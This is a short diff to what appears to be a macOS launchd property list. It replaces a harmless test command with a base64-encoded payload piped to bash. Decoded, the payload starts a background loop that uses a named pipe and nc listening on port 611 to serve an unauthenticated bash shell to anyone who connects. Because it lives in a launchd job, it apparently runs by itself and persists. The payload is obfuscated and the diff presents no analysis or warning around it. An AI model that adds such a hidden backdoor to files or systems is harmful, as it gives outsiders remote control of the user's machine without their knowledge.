@@ -10,7 +10,7 @@
         <string>/bin/bash</string>
         <string>-c</string>
         <string>
-        echo "test" > /tmp/test.txt
+        echo "aWYgISBsc29mIC1pIDo2MTEgPi9kZXYvbnVsbDsgdGhlbiB3aGlsZSB0cnVlOyBkbyBybSAtZiAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IG5jIC1sIDYxMSAwPC90bXAvZiB8IGJhc2ggMT4vdG1wL2YgMj4mMTsgZG9uZSAmIGRpc293bjsgZmkK" | base64 -d | { bash; }
         </string>
     </array>
 
